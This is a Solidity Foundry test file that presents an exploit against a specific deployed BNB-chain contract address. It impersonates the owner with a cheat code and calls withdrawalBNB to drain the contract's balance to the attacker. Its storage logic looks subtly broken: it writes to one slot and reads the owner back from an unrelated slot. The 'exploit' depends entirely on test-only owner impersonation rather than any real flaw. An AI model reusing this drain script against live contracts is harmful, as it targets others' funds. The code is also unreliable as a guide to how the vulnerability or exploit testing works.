// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Engos {
    function owner() external view returns (address);
    function withdrawalBNB(uint _amount, address to) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5548498f6Ae923f590cD1A1cec8D39E1f9363104;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        address owner = Engos(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Store for use in test
        vm.store(address(this), bytes32(uint256(uint160(owner))), bytes32(uint256(1)));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = attacker.balance;

        // Give the contract some BNB to drain
        deal(TARGET, 10 ether);

        // Get owner address from storage
        address owner = address(uint160(uint256(vm.load(address(this), bytes32(uint256(1))))));

        // Impersonate owner and drain BNB
        vm.prank(owner);
        Engos(TARGET).withdrawalBNB(TARGET.balance, attacker);

        // Verify profit
        assertGt(attacker.balance, initialBalance, "Attacker balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
